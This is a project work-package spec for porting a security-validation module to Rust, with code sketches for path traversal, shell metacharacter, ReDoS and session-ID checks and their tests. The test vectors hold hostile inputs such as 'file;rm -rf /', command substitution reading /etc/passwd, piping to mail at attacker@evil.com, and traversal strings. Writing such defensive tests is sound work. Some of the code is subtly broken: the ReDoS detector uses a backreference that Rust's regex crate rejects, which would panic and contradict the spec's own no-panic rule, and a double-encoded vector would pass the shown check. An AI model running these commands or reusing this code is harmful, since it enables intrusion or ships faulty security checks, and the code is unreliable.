---
work_package_id: "WP05"
title: "Security Validation"
lane: "planned"
dependencies: ["WP01", "WP04"]
subtasks: ["T020", "T021", "T022", "T023", "T024", "T025"]
---

# WP05: Security Validation

## Objective

Port `security.gleam` (296 lines) with path traversal, shell metacharacter, and ReDoS validation.

## Context

- **Source**: `/tmp/intent-cli/src/intent/security.gleam` (296 lines)
- **Target**: `clarity-web/src/intent/security.rs`
- **Priority**: P0 (Critical)

## Contract Specification

### Preconditions

| ID | Precondition | Enforcement Level |
|----|--------------|-------------------|
| P1 | Input string is valid UTF-8 | Compile-time |
| P2 | Session ID matches `^[a-zA-Z0-9_-]+$` | Runtime regex |

### Postconditions

| ID | Postcondition | Verification |
|----|---------------|--------------|
| Q1 | Path traversal returns Ok only for safe paths | Fuzz test |
| Q2 | Shell metacharacters detected in all known patterns | Test vectors |
| Q3 | ReDoS patterns detected with no false negatives | Property test |
| Q4 | Session ID validation is deterministic | Same input → same output |

### Invariants

| ID | Invariant |
|----|-----------|
| I1 | Security functions never panic |
| I2 | Security functions always return Result |
| I3 | Empty input is treated as potentially dangerous |
| I4 | URL-decoded input is also checked |

### Error Taxonomy

```rust
#[derive(Debug, Clone, PartialEq, thiserror::Error)]
pub enum SecurityError {
    #[error("Path traversal detected: {pattern}")]
    PathTraversal { pattern: String, input: String },

    #[error("Shell metacharacter detected: {char}")]
    ShellMetacharacter { char: String, input: String },

    #[error("ReDoS-vulnerable pattern: {description}")]
    RedosPattern { description: String, pattern: String },

    #[error("Invalid session ID format")]
    InvalidSessionId { input: String },

    #[error("URL-encoded attack pattern")]
    EncodedAttack { decoded: String, input: String },
}
```

### Violation Examples (REQUIRED)

```
VIOLATES I1: Security function panics on input
  -> UNACCEPTABLE - all paths must return Result

VIOLATES I2: Security function returns Option instead of Result
  -> UNACCEPTABLE - must use Result for error context

VIOLATES P2: Session ID contains special chars "sess-<script>"
  -> SecurityError::InvalidSessionId { input: "sess-<script>" }
```

---

## Subtasks

### T020: Create `clarity-web/src/intent/security.rs` module

```rust
//! Security validation functions
//!
//! # Security Model
//! All functions in this module follow these principles:
//! 1. Never panic - always return Result
//! 2. Fail closed - reject on any doubt
//! 3. Check decoded forms of encoded input
//! 4. Log all rejections for audit

use crate::intent::errors::SecurityError;

/// Security check result type
pub type SecurityResult<T> = Result<T, SecurityError>;
```

### T021: Implement `check_literal_traversal()` for path validation

```rust
/// Check for path traversal patterns
///
/// # Patterns Detected
/// - `..` (parent directory)
/// - `../` and `..\\` (variants)
/// - URL-encoded: `%2e%2e`, `%2e%2e%2f`, `%2e%2e/`
/// - Double-encoded variants
///
/// # Examples
/// ```
/// assert!(check_literal_traversal("safe/path").is_ok());
/// assert!(check_literal_traversal("../etc/passwd").is_err());
/// assert!(check_literal_traversal("%2e%2e%2fetc/passwd").is_err());
/// ```
pub fn check_literal_traversal(input: &str) -> SecurityResult<&str> {
    // Check literal patterns
    if input.contains("..") {
        return Err(SecurityError::PathTraversal {
            pattern: "..".to_string(),
            input: input.to_string(),
        });
    }

    // Check URL-encoded patterns
    let lower = input.to_lowercase();
    if lower.contains("%2e%2e") {
        return Err(SecurityError::EncodedAttack {
            decoded: "..".to_string(),
            input: input.to_string(),
        });
    }

    Ok(input)
}
```

### T022: Implement `check_shell_metacharacters()` function

```rust
/// Characters that are dangerous in shell contexts
const SHELL_METACHARACTERS: &[&str] = &[
    ";", "&", "|", "$", "`", "(", ")", "<", ">",
    "\n", "\r", "\t", "*", "?", "[", "]", "{", "}",
    "!", "#", "~", "\"", "'", "\\", " ",
];

/// Check for shell metacharacters
///
/// # Security Model
/// Any shell metacharacter is rejected, as escaping is error-prone.
/// Use allowlists instead of blocklists where possible.
///
/// # Examples
/// ```
/// assert!(check_shell_metacharacters("safe_filename.txt").is_ok());
/// assert!(check_shell_metacharacters("rm -rf /").is_err());
/// assert!(check_shell_metacharacters("file;cat /etc/passwd").is_err());
/// ```
pub fn check_shell_metacharacters(input: &str) -> SecurityResult<&str> {
    for &meta in SHELL_METACHARACTERS {
        if input.contains(meta) {
            return Err(SecurityError::ShellMetacharacter {
                char: meta.to_string(),
                input: input.to_string(),
            });
        }
    }
    Ok(input)
}
```

### T023: Implement `check_url_encoded()` for encoded path traversal

```rust
/// Check for URL-encoded attack patterns
///
/// Decodes percent-encoded strings and checks underlying patterns
pub fn check_url_encoded(input: &str) -> SecurityResult<&str> {
    // Decode percent-encoding
    let decoded = urlencoding_decode(input)?;

    // Re-check decoded form for patterns
    check_literal_traversal(&decoded)?;

    Ok(input)
}
```

### T024: Implement `check_regex_redos()` for catastrophic backtracking detection

```rust
/// Patterns that indicate ReDoS vulnerability
const REDOS_PATTERNS: &[&str] = &[
    // Nested quantifiers
    r"(\+|\*)\s*\1",
    // Alternation with overlapping prefixes
    r"\|.*\|",
    // Back-references with quantifiers
    r"\\[0-9]\s*(\+|\*)",
];

/// Check for ReDoS-vulnerable regex patterns
///
/// # Detection Strategy
/// 1. Check for nested quantifiers: `(a+)+`, `(a*)*`, `(a|b+)+`
/// 2. Check for overlapping alternations: `(a|a|b)+`
/// 3. Check for back-references with quantifiers
///
/// # Limitations
/// This is a heuristic check, not a complete ReDoS detector.
/// Use `regex` crate with bounded repetition for safety.
///
/// # Examples
/// ```
/// assert!(check_regex_redos("^[a-z]+$").is_ok());
/// assert!(check_regex_redos("(a+)+").is_err());  // Nested quantifiers
/// ```
pub fn check_regex_redos(pattern: &str) -> SecurityResult<&str> {
    for &redos_pattern in REDOS_PATTERNS {
        let re = regex::Regex::new(redos_pattern)
            .expect("REDOS detection patterns should be valid");
        if re.is_match(pattern) {
            return Err(SecurityError::RedosPattern {
                description: "Potential catastrophic backtracking".to_string(),
                pattern: pattern.to_string(),
            });
        }
    }
    Ok(pattern)
}
```

### T025: Implement `validate_session_id()` format check

```rust
/// Session ID must match: ^[a-zA-Z0-9_-]+$
///
/// # Rationale
/// - Alphanumeric plus underscore and hyphen only
/// - No spaces, quotes, or shell metacharacters
/// - Length between 1 and 128 characters
pub fn validate_session_id(id: &str) -> SecurityResult<&str> {
    if id.is_empty() || id.len() > 128 {
        return Err(SecurityError::InvalidSessionId {
            input: id.to_string(),
        });
    }

    let valid = id.chars().all(|c| {
        c.is_ascii_alphanumeric() || c == '_' || c == '-'
    });

    if !valid {
        return Err(SecurityError::InvalidSessionId {
            input: id.to_string(),
        });
    }

    Ok(id)
}
```

---

## Test Strategy

### Test Vectors for Path Traversal

```rust
#[test]
fn test_path_traversal_vectors() {
    let dangerous = vec![
        "../etc/passwd",
        "..\\windows\\system32",
        "....//....//etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
        "%252e%252e%252f",  // Double-encoded
        "..%00.jpg",  // Null byte injection
        "..%c0%af",    // Overlong UTF-8
    ];

    for input in dangerous {
        assert!(check_literal_traversal(input).is_err(),
            "Should reject: {}", input);
    }
}
```

### Test Vectors for Shell Metacharacters

```rust
#[test]
fn test_shell_meta_vectors() {
    let dangerous = vec![
        "file;rm -rf /",
        "file`whoami`",
        "file$(cat /etc/passwd)",
        "file > /dev/null",
        "file | mail attacker@evil.com",
        "file&background",
    ];

    for input in dangerous {
        assert!(check_shell_metacharacters(input).is_err(),
            "Should reject: {}", input);
    }
}
```

### Property Tests for ReDoS

```rust
proptest! {
    #[test]
    fn test_redos_deterministic(pattern: String) {
        let result1 = check_regex_redos(&pattern);
        let result2 = check_regex_redos(&pattern);
        assert_eq!(result1.is_ok(), result2.is_ok());
    }
}
```

---

## Definition of Done

- [ ] All 5 check functions implemented
- [ ] SecurityError enum complete
- [ ] Test vectors pass for all functions
- [ ] No panics in any code path
- [ ] Property tests for determinism
